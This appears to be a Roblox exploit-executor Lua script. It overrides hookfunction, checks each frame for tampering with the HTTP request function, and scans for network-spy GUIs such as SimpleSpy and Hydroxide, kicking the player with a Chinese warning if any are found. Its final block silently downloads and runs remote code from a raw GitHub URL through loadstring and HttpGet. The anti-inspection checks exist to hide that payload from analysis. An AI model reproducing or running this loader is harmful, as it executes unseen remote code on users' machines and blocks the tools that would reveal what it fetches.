local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local genv = getgenv and getgenv() or _G

local alreadyKicked = false

local function kickSpy(reason)
    if alreadyKicked then return end
    alreadyKicked = true
    pcall(function()
        LP:Kick("\n警告\n检测到抓包工具正在运行\n原因: " .. reason .. "\n错误码: 267")
    end)
end

if type(hookfunction) == "function" then
    local originalHook = hookfunction
    pcall(function()
        hookfunction = function(target, replacement)
            local targetStr = tostring(target)
            if target == genv.request or target == genv.http_request or targetStr:find("request") then
                kickSpy("恶意 Hook 网络函数")
            end
            return originalHook(target, replacement)
        end
    end)
end

local function checkSpyTraces()
    local req = genv.request or rawget(_G, "request")

    if req then
        local str = tostring(req)
        if type(iscclosure) == "function" then
            if not iscclosure(req) then
                return "request 被篡改为 Lua 闭包"
            end
        elseif str:find("function: 0x") and not str:find("builtin") and not str:find("C") then
            return "request 显示为 Lua 闭包特征"
        end
    end

    local spyNames = {"HTTPSpy", "LinksSpy", "SimpleSpy", "Hydroxide", "RemoteSpy", "SpyPanel"}
    local function scanGui(container)
        if not container then return false end
        local ok, found = pcall(function()
            for _, obj in ipairs(container:GetDescendants()) do
                local n = obj.Name:lower()
                for _, spy in ipairs(spyNames) do
                    if n:find(spy:lower()) then return true end
                end
            end
            return false
        end)
        return ok and found
    end

    local pg = LP:FindFirstChild("PlayerGui")
    if scanGui(game:GetService("CoreGui")) or scanGui(pg) then
        return "发现 Spy GUI 注入"
    end

    if genv.HttpSpyHook or genv.LinksSpyEnabled or rawget(genv, "SimpleSpy") then
        return "发现 Spy 全局特征"
    end

    return nil
end

RunService.Heartbeat:Connect(function()
    if alreadyKicked then return end

    local reason = checkSpyTraces()
    if reason then
        kickSpy(reason)
    end
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qwrt5589/eododo/244a680e45f8277980d956df250224611dbdea41/46.lua"))()
    end)
end)